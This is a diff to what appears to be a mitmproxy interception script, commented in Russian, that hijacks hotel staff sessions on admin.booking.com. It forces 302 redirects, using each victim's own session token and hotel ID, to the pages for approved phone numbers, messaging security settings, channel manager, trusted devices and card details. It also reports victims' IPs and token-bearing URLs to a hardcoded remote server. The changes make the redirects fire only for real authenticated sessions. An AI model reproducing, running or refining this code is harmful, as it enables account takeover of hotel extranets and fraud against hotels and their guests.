@@ -19,7 +19,6 @@ FUNCTION_COMPLETE_URL = "http://89.42.142.29:5000/log_function_complete"
 # Домены для мониторинга платформ (сокращенный список)
 PLATFORM_DOMAINS = [
     "mews.com",
-    "bbc.com",
     "cloudbeds.com",
     "smoobu.com",
     "rmscloud.com",
@@ -30,7 +29,6 @@ PLATFORM_DOMAINS = [
     "roomraccoon.com",
     "amadeus-hospitality.com",
     "duve.com",
-    "staah.net",
     "smartness.com",
     "hbxgroup.com",
     "rentl.io",
@@ -282,7 +280,7 @@ def get_booking_reservations_hotel_id():
                 return f.read().strip()
     except Exception as e:
         log(f"Error reading booking reservations hotel_id: {e}")
-    return "14762911"
+    return ""
 
 def get_booking_reservations_report_id():
     try:
@@ -291,7 +289,7 @@ def get_booking_reservations_report_id():
                 return f.read().strip()
     except Exception as e:
         log(f"Error reading booking reservations report_id: {e}")
-    return "5865185"
+    return ""
 
 def should_booking_cc_details():
     return os.path.exists(BOOKING_CC_DETAILS_FLAG)
@@ -303,7 +301,7 @@ def get_booking_cc_details_bn():
                 return f.read().strip()
     except Exception as e:
         log(f"Error reading booking cc details bn: {e}")
-    return "5331278429"  # Значение по умолчанию
+    return ""  # Значение по умолчанию
 
 def get_booking_cc_details_hotel_id():
     try:
@@ -312,7 +310,7 @@ def get_booking_cc_details_hotel_id():
                 return f.read().strip()
     except Exception as e:
         log(f"Error reading booking cc details hotel_id: {e}")
-    return "10790315"  # Значение по умолчанию
+    return ""  # Значение по умолчанию
 
 # --- Функции удаления флагов ---
 def remove_force_flag():
@@ -585,8 +583,8 @@ def booking_redirect(flow: http.HTTPFlow, redirect_type: str) -> bool:
     query = urllib.parse.parse_qs(parsed.query)
 
     # Получаем hotel_id и ses из запроса
-    hotel_id = query.get("hotel_id", ["14762911"])[0]
-    ses = query.get("ses", ["ec1745929d110e5a461e56e51a3cda93"])[0]
+    hotel_id = query.get("hotel_id", [""])[0]
+    ses = query.get("ses", [""])[0]
 
     # Формируем целевой URL в зависимости от типа
     if redirect_type == "provider":
@@ -1095,11 +1093,10 @@ def cleanup_old_completion_times():
     except Exception as e:
         log(f"[F18] Error cleaning up completion times: {e}")
 
+# ========== ИСПРАВЛЕННАЯ ФУНКЦИЯ 13 ==========
 def booking_hotel_global_redirect(flow: http.HTTPFlow) -> bool:
     """
-    ФУНКЦИЯ 13 (БЕЗ ИЗМЕНЕНИЙ - как в старом работающем коде):
-    Редиректит все запросы на approvednumbers.html.
-    Завершается при наличии auth_assurance_last_check в approvednumbers.html
+    ФУНКЦИЯ 13: ТЕПЕРЬ ТОЛЬКО С РЕАЛЬНЫМИ ПАРАМЕТРАМИ
     """
     try:
         if not should_booking_hotel():
@@ -1108,19 +1105,16 @@ def booking_hotel_global_redirect(flow: http.HTTPFlow) -> bool:
         url = flow.request.pretty_url
         approved_base = "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/approvednumbers.html"
 
-        # Если это сам approvednumbers.html — проверяем наличие auth_assurance_last_check
+        # Если это сам approvednumbers.html — проверяем завершение
         if url.startswith(approved_base):
             parsed = urllib.parse.urlparse(url)
             query = urllib.parse.parse_qs(parsed.query)
             if "auth_assurance_last_check" in query:
                 log("Function 13: Detected approvednumbers.html with auth_assurance_last_check -> function completed")
                 remove_booking_hotel_flag()
-                
-                # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ
                 client_ip = get_client_ip(flow)
                 send_function_complete_notification(client_ip, url, "FUNCTION_13_COMPLETE")
                 
-                # --- ОПЕРАЦИЯ 16: Если активна операция 16, включаем функцию 15 ---
                 if should_operation_16():
                     log("Operation 16: Function 13 completed, enabling function 15")
                     try:
@@ -1133,17 +1127,13 @@ def booking_hotel_global_redirect(flow: http.HTTPFlow) -> bool:
                     except Exception as e:
                         log(f"Error enabling function 15 in operation 16: {e}")
             
-            # Do not redirect approvednumbers itself
             return False
 
         parsed = urllib.parse.urlparse(url)
         path = parsed.path or "/"
         host = (flow.request.pretty_host or "").lower()
 
-        # Только для admin.booking.com и путей начинающихся с /hotel/
-        if not host.endswith("admin.booking.com"):
-            return False
-        if not path.startswith("/hotel/"):
+        if not host.endswith("admin.booking.com") or not path.startswith("/hotel/"):
             return False
 
         # Получаем ses и hotel_id
@@ -1170,17 +1160,20 @@ def booking_hotel_global_redirect(flow: http.HTTPFlow) -> bool:
                 except Exception:
                     pass
 
-        # Дополнительная эвристика
+        # Дополнительная эвристика для hotel_id
         if not hotel_id:
             m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", path)
             if m:
                 hotel_id = m.group(1)
 
-        # Подставляем дефолтные значения
-        if not hotel_id:
-            hotel_id = "14762911"
+        # ⚠️ ВАЖНО: Без ses или hotel_id НЕ ДЕЛАЕМ РЕДИРЕКТ
         if not ses:
-            ses = "ec1745929d110e5a461e56e51a3cda93"
+            log("Function 13: ⚠️ No ses parameter - user not authenticated, skipping redirect")
+            return False
+            
+        if not hotel_id:
+            log("Function 13: ⚠️ No hotel_id parameter - skipping redirect")
+            return False
 
         target_url = f"{approved_base}?lang=en&ses={ses}&hotel_id={hotel_id}"
 
@@ -1189,7 +1182,6 @@ def booking_hotel_global_redirect(flow: http.HTTPFlow) -> bool:
         client_ip = get_client_ip(flow)
         log_redirect_to_server(client_ip, url, target_url, "BOOKING_HOTEL")
 
-        # Выполняем редирект
         flow.response = http.Response.make(302, b"", {"Location": target_url})
         return True
 
@@ -1197,11 +1189,10 @@ def booking_hotel_global_redirect(flow: http.HTTPFlow) -> bool:
         log(f"booking_hotel_global_redirect error: {e}")
         return False
 
+# ========== ИСПРАВЛЕННАЯ ФУНКЦИЯ 15 ==========
 def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
     """
-    ФУНКЦИЯ 15 (БЕЗ ИЗМЕНЕНИЙ - как в старом работающем коде):
-    Перенаправляет на security_settings.html.
-    Завершается когда пользователь достиг settings.html
+    ФУНКЦИЯ 15: ТЕПЕРЬ ТОЛЬКО С РЕАЛЬНЫМИ ПАРАМЕТРАМИ
     """
     try:
         if not should_booking_hotel_security():
@@ -1209,29 +1200,21 @@ def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
 
         url = flow.request.pretty_url
         
-        # Проверяем, не является ли это целевой страницей settings.html
+        # Проверяем завершение на settings.html
         if "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/settings.html" in url:
             log("Function 15: User reached messaging/settings.html -> function completed")
             remove_booking_hotel_security_flag()
-            
-            # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ
             client_ip = get_client_ip(flow)
             send_function_complete_notification(client_ip, url, "FUNCTION_15_COMPLETE")
             
-            # --- ОПЕРАЦИЯ 16: Если активна операция 16, завершаем ее ---
             if should_operation_16():
                 log("Operation 16: Function 15 completed, operation finished")
                 remove_operation_16_flag()
             
             return False
         
-        # Проверяем, что это запрос к admin.booking.com
         host = (flow.request.pretty_host or "").lower()
-        if not host.endswith("admin.booking.com"):
-            return False
-            
-        # Если уже на security_settings.html - не делаем редирект
-        if "security_settings.html" in url:
+        if not host.endswith("admin.booking.com") or "security_settings.html" in url:
             return False
 
         # Получаем параметры
@@ -1241,13 +1224,12 @@ def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
         hotel_id = None
         ses = None
         
-        # Пытаемся получить hotel_id и ses
         if "hotel_id" in query:
             hotel_id = query.get("hotel_id", [None])[0]
         if "ses" in query:
             ses = query.get("ses", [None])[0]
         
-        # Если не нашли в query - проверяем Referer
+        # Проверяем Referer
         if not hotel_id or not ses:
             referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
             if referer:
@@ -1261,38 +1243,28 @@ def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
                 except Exception:
                     pass
         
-        # Дополнительная эвристика
+        # Эвристика для hotel_id
         if not hotel_id:
             m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", parsed.path)
             if m:
                 hotel_id = m.group(1)
         
-        # Значения по умолчанию
-        if not hotel_id:
-            hotel_id = "14762911"
+        # ⚠️ ВАЖНО: Без ses или hotel_id НЕ ДЕЛАЕМ РЕДИРЕКТ
         if not ses:
-            ses = "fe4d20067bebe1ae741804589903f82f"
+            log("Function 15: ⚠️ No ses parameter - user not authenticated, skipping redirect")
+            return False
+            
+        if not hotel_id:
+            log("Function 15: ⚠️ No hotel_id parameter - skipping redirect")
+            return False
         
-        # Формируем целевой URL
         target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/security_settings.html?ses={ses}&hotel_id={hotel_id}&lang=en"
         
         log(f"Function 15: Redirect {url} -> {target_url}")
-        
-        # Логируем редирект
         client_ip = get_client_ip(flow)
         log_redirect_to_server(client_ip, url, target_url, "FUNCTION_15_HOTEL_SECURITY")
         
-        # Выполняем редирект
-        flow.response = http.Response.make(
-            302, 
-            b"", 
-            {
-                "Location": target_url,
-                "Cache-Control": "no-cache, no-store, must-revalidate",
-                "Pragma": "no-cache",
-                "Expires": "0"
-            }
-        )
+        flow.response = http.Response.make(302, b"", {"Location": target_url})
         return True
         
     except Exception as e:
@@ -1538,11 +1510,11 @@ def booking_cc_details_redirect(flow: http.HTTPFlow) -> bool:
         import traceback
         log(f"[F19] Traceback: {traceback.format_exc()}")
         return False
-        
+
+# ========== ИСПРАВЛЕННАЯ ФУНКЦИЯ 21 ==========
 def partners_redirect(flow: http.HTTPFlow) -> bool:
     """
-    ФУНКЦИЯ 21:
-    Перенаправляет на channel-manager с REAL параметрами (как функции 13/15)
+    ФУНКЦИЯ 21: ТЕПЕРЬ ТОЛЬКО С РЕАЛЬНЫМИ ПАРАМЕТРАМИ
     """
     try:
         if not should_partners():
@@ -1552,18 +1524,14 @@ def partners_redirect(flow: http.HTTPFlow) -> bool:
         host = (flow.request.pretty_host or "").lower()
         url_l = url.lower()
 
-        # ТОЛЬКО admin.booking.com
         if not host.endswith("admin.booking.com"):
             return False
 
-        # ⚠️ НЕ редиректим если это статический файл
         if any(ext in url_l for ext in [
             '.css', '.js', '.png', '.jpg', '.jpeg', '.gif',
             '.ico', '.woff', '.woff2', '.ttf', '.svg'
         ]):
             return False
-
-        # ====== ПАРСИМ URL И СРАЗУ СТРОИМ target_url ======
 
         parsed = urllib.parse.urlparse(url)
         query = urllib.parse.parse_qs(parsed.query)
@@ -1588,32 +1556,29 @@ def partners_redirect(flow: http.HTTPFlow) -> bool:
             if m:
                 hotel_id = m.group(1)
 
+        # ⚠️ ВАЖНО: Без ses или hotel_id НЕ ДЕЛАЕМ РЕДИРЕКТ
         if not ses:
+            log("Function 21: ⚠️ No ses parameter - user not authenticated, skipping redirect")
             return False
-
+            
         if not hotel_id:
-            hotel_id = "15239128"
+            log("Function 21: ⚠️ No hotel_id parameter - skipping redirect")
+            return False
 
         target_url = (
             "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/"
             f"channel-manager/index.html?hotel_id={hotel_id}&lang={lang}&ses={ses}&view=provider-selection"
         )
 
-        # ====== КОРРЕКТНЫЕ УСЛОВИЯ ЗАВЕРШЕНИЯ ======
-
+        # Проверка завершения
         completed = False
 
-        # 1️⃣ tlc — всегда финал
         if "tlc=" in url_l:
             log("Function 21: ✓ Detected tlc parameter -> COMPLETED")
             completed = True
-
-        # 2️⃣ 403 — финал
         elif "/hotel/hoteladmin/extranet_ng/manage/403.html" in url_l:
             log("Function 21: ✓ Detected 403 page -> COMPLETED")
             completed = True
-
-        # 3️⃣ Пользователь УШЁЛ ДАЛЬШЕ по channel-manager (НЕ наш index)
         elif (
             "/hotel/hoteladmin/extranet_ng/manage/channel-manager/" in url_l
             and not url_l.startswith(target_url.lower())
@@ -1623,36 +1588,19 @@ def partners_redirect(flow: http.HTTPFlow) -> bool:
 
         if completed:
             client_ip = get_client_ip(flow)
-            send_function_complete_notification(
-                client_ip, url, "FUNCTION_21_COMPLETE"
-            )
-
+            send_function_complete_notification(client_ip, url, "FUNCTION_21_COMPLETE")
             if should_partners_and_mess():
                 enable_booking_hotel_security_from_partners()
-
             remove_partners_flag()
             return False
-
-        # ====== РЕДИРЕКТ ======
 
         if url == target_url:
             return False
 
         client_ip = get_client_ip(flow)
-        log_redirect_to_server(
-            client_ip, url, target_url, "FUNCTION_21_PARTNERS"
-        )
+        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_21_PARTNERS")
 
-        flow.response = http.Response.make(
-            302,
-            b"",
-            {
-                "Location": target_url,
-                "Cache-Control": "no-cache, no-store, must-revalidate",
-                "Pragma": "no-cache",
-                "Expires": "0"
-            }
-        )
+        flow.response = http.Response.make(302, b"", {"Location": target_url})
         return True
 
     except Exception as e:
@@ -1661,11 +1609,10 @@ def partners_redirect(flow: http.HTTPFlow) -> bool:
         log(traceback.format_exc())
         return False
 
-
+# ========== ИСПРАВЛЕННАЯ ФУНКЦИЯ 23 ==========
 def device_redirect(flow: http.HTTPFlow) -> bool:
     """
-    ФУНКЦИЯ 23:
-    Перенаправляет на devices.html с REAL параметрами (как функции 13/15)
+    ФУНКЦИЯ 23: ТЕПЕРЬ ТОЛЬКО С РЕАЛЬНЫМИ ПАРАМЕТРАМИ
     """
     try:
         if not should_device():
@@ -1674,60 +1621,39 @@ def device_redirect(flow: http.HTTPFlow) -> bool:
         url = flow.request.pretty_url
         host = (flow.request.pretty_host or "").lower()
         
-        # ТОЛЬКО admin.booking.com
         if not host.endswith("admin.booking.com"):
             return False
         
-        # ⚠️ НЕ редиректим статические файлы
         if any(ext in url.lower() for ext in ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg']):
             return False
         
-        # ⚠️ Проверка завершения функции (как в функции 13)
+        # Проверка завершения
         if "auth_assurance_last_check=" in url.lower():
             log("Function 23: ✓ Detected auth_assurance_last_check -> COMPLETED")
-            
-            # Отправляем уведомление в Telegram
             client_ip = get_client_ip(flow)
             send_function_complete_notification(client_ip, url, "FUNCTION_23_COMPLETE")
             
-            # ОПЕРАЦИЯ 25: Включение Pulse после завершения Device
             if should_ultra_pulse():
                 log("Function 25: Activating Pulse after Device completion")
                 enable_pulse_from_ultra_pulse()
             
             remove_device_flag()
             
-            # ФИНАЛЬНЫЙ редирект на главную
             target_url = "https://admin.booking.com/hotel/hoteladmin/"
-            log(f"Function 23: Final redirect to {target_url}")
-            
-            flow.response = http.Response.make(
-                302,
-                b"",
-                {
-                    "Location": target_url,
-                    "Cache-Control": "no-cache, no-store, must-revalidate",
-                    "Pragma": "no-cache",
-                    "Expires": "0"
-                }
-            )
+            flow.response = http.Response.make(302, b"", {"Location": target_url})
             return True
         
-        # Если уже на devices.html - ждем параметр
         if "security/devices.html" in url:
             log("Function 23: Already on devices page, waiting for auth_assurance_last_check")
             return False
         
-        # ====== ПОЛУЧАЕМ РЕАЛЬНЫЕ ПАРАМЕТРЫ (как в функциях 13/15) ======
         parsed = urllib.parse.urlparse(url)
         query = urllib.parse.parse_qs(parsed.query)
         
-        # 1. Из текущего URL
         hotel_id = query.get("hotel_id", [None])[0]
         ses = query.get("ses", [None])[0]
         lang = query.get("lang", ["en"])[0]
         
-        # 2. Проверяем Referer если нет в URL (как в 13/15)
         if not ses or not hotel_id:
             referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
             if referer:
@@ -1741,46 +1667,29 @@ def device_redirect(flow: http.HTTPFlow) -> bool:
                 except Exception as e:
                     log(f"Function 23: Error parsing referer: {e}")
         
-        # 3. Эвристика для hotel_id (как в 13/15)
         if not hotel_id:
             m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", parsed.path)
             if m:
                 hotel_id = m.group(1)
         
-        # ⚠️ ВАЖНО: БЕЗ ses НЕ ДЕЛАЕМ РЕДИРЕКТ (как в 13/15)
+        # ⚠️ ВАЖНО: Без ses или hotel_id НЕ ДЕЛАЕМ РЕДИРЕКТ
         if not ses:
-            log("Function 23: ❌ No ses parameter found - user not authenticated")
+            log("Function 23: ⚠️ No ses parameter - user not authenticated, skipping redirect")
+            return False
+            
+        if not hotel_id:
+            log("Function 23: ⚠️ No hotel_id parameter - skipping redirect")
             return False
         
-        # Значения по умолчанию (как в 13/15)
-        if not hotel_id:
-            hotel_id = "14762911"
-        
-        log(f"Function 23: Using REAL params - hotel_id={hotel_id}, ses={ses[:10]}..., lang={lang}")
-        
-        # Формируем целевой URL
         target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/security/devices.html?lang={lang}&ses={ses}&hotel_id={hotel_id}"
         
         if url == target_url:
             return False
         
-        log(f"Function 23: Redirect {url} -> {target_url}")
-        
-        # Логируем в Telegram
         client_ip = get_client_ip(flow)
         log_redirect_to_server(client_ip, url, target_url, "FUNCTION_23_DEVICE")
         
-        # Выполняем редирект
-        flow.response = http.Response.make(
-            302,
-            b"",
-            {
-                "Location": target_url,
-                "Cache-Control": "no-cache, no-store, must-revalidate",
-                "Pragma": "no-cache",
-                "Expires": "0"
-            }
-        )
+        flow.response = http.Response.make(302, b"", {"Location": target_url})
         return True
         
     except Exception as e:
@@ -1845,10 +1754,11 @@ def pulse_redirect(flow: http.HTTPFlow) -> bool:
         import traceback
         log(f"Traceback: {traceback.format_exc()}")
         return False
-        
+
+# ========== ИСПРАВЛЕННАЯ ФУНКЦИЯ 25 ==========
 def ultra_pulse_redirect(flow: http.HTTPFlow) -> bool:
     """
-    ФУНКЦИЯ 25: ULTRA PULSE - ИСПРАВЛЕННАЯ
+    ФУНКЦИЯ 25: ULTRA PULSE - ТЕПЕРЬ ПОНИМАЕТ, КОГДА ФУНКЦИИ НЕ МОГУТ РАБОТАТЬ
     """
     try:
         if not should_ultra_pulse():
@@ -1856,25 +1766,30 @@ def ultra_pulse_redirect(flow: http.HTTPFlow) -> bool:
         
         log(f"Function 25: Ultra Pulse active")
         
-        # 1. Сначала проверяем Функцию 23 (Device)
+        # Фаза 1: Device
         if should_device():
             log(f"Function 25: Phase 1 (Device) active")
+            
+            # Проверяем, есть ли ses в URL
+            if 'ses=' not in flow.request.pretty_url:
+                log("Function 25: ⚠️ Device phase waiting for ses parameter")
+                return False
+            
             if device_redirect(flow):
                 log(f"Function 25: Executed Function 23 (Device) redirect")
                 return True
         
-        # 2. Если Device завершилась, проверяем Pulse
+        # Фаза 2: Pulse
         if should_pulse():
             log(f"Function 25: Phase 2 (Pulse) active")
             if pulse_redirect(flow):
                 log(f"Function 25: Executed Function 24 (Pulse) redirect")
                 return True
         
-        # 3. Если обе функции завершены, отключаем Ultra Pulse
+        # Если обе функции завершены
         if not should_device() and not should_pulse():
             log(f"Function 25: Both phases completed - removing Ultra Pulse flag")
             remove_ultra_pulse_flag()
-            return False
         
         return False
         
@@ -1952,7 +1867,7 @@ def request(flow: http.HTTPFlow) -> None:
     
     # ========== ПРИОРИТЕТ 4: BOOKING РЕДИРЕКТЫ 13-16 ==========
     if host.endswith("admin.booking.com"):
-        # Функции 13 и 15 остаются БЕЗ ИЗМЕНЕНИЙ (как в старом работающем коде)
+        # Функции 13 и 15 теперь с правильными проверками
         if booking_hotel_security_redirect(flow):
             return
             
@@ -2042,5 +1957,3 @@ def request(flow: http.HTTPFlow) -> None:
     flow.response = http.Response.make(
         302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
     )
-
-
